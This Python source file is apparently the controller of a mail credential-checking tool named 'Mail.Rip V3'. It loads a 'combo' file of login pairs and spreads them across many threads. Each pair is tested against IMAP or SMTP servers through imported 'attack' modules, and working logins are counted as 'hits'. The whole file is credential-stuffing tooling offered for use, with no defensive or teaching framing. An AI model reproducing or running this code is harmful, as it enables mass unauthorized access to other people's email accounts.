import sys
import threading
import inc_attackimap as ic
import inc_attacksmtp as sc
from queue import Queue
from time import sleep
from inc_comboloader import comboloader
from inc_etc import clean

from imap.models import ProxyConfig

targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()


def checker_thread(checker_type, default_timeout, default_email):
    '''
    Function for a single thread which performs the main checking process.

    :param str checker_type: smtp or imap
    :param float default_timeout: timeout for server connection
    :param str default_email: user's email for test messages (SMTP only)
    :return: None
    '''
    # set variables:
    global targets_left
    global hits
    global fails
    # start thread for chosen checker type:
    while True:
        target = str(checker_queue.get())
        result = False
        try:
            if checker_type == 'smtp':
                result = sc.smtpchecker(
                    float(default_timeout),
                    str(default_email),
                    str(f'{target}')
                )
            elif checker_type == 'imap':
                result = ic.imapchecker(
                    float(default_timeout),
                    str(f'{target}')
                )
        except:
            pass
        # update stats:
        if result == True:
            hits += 1
        else:
            fails += 1
        targets_left -= 1
        checker_queue.task_done()
    # cooldown for checker thread:
    sleep(3.0)
    return None


def checker(checker_type, default_threads, default_timeout, default_email, combofile):
    '''
    Function to control the import of combos, to start threads etc.

    :param str checker_type: smtp or imap
    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str default_email: users's email for test-messages (SMTP only)
    :param str combofile: textfile with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    # set variables:
    global targets_total
    global targets_left
    combos_available = False
    try:
        try:
            combos = comboloader(combofile)
        except:
            combos = []
        targets_total = len(combos)
        targets_left = targets_total
        if targets_total > 0:
            combos_available = True
        if combos_available:
            for _ in range(default_threads):
                single_thread = threading.Thread(
                    target=checker_thread,
                    args=(str(f'{checker_type}'), default_timeout, default_email),
                    daemon=True
                )
                single_thread.start()
            # fill queue with combos:
            for target in combos:
                checker_queue.put(target)
            # checker stats in window title:
            while targets_left > 0:
                try:
                    sleep(1.0)
                    titlestats = str(f'LEFT: {str(targets_left)} # HITS: {str(hits)} # FAILS: {str(fails)}')
                    sys.stdout.write('\33]0;' + titlestats + '\a')
                    sys.stdout.flush()
                except:
                    pass
            # finish checker:
            checker_queue.join()
            sleep(3.0)
        return True
    except:
        return False


def main(user, file):
    config = ProxyConfig.objects.get(user=user)
    default_timeout = config.timeout
    default_threads = config.threads
    default_email = config.user.email
    combofile = file
    checker_type = 'imap'
    try:
        checker_result = checker(
            checker_type,
            default_threads,
            default_timeout,
            default_email,
            combofile
        )
        # show summary and quit:
        if checker_result == True:
            print(
                '\n\n'
                + f'Mail.Rip V3 - ({checker_type}) checker results:\n'
                + 38 * '-' + '\n\n'
                + f'combos:    {str(targets_total)}\n'
                + f'hits:      {str(hits)}\n'
                + f'fails:     {str(fails)}\n\n'
                + 38 * '-' + '\n'
            )
    except:
        clean()
        print('\n\n*** SORRY ***\nAn error occurred. Press [ENTER] and try again, please!\n')
        input()
    sys.exit()
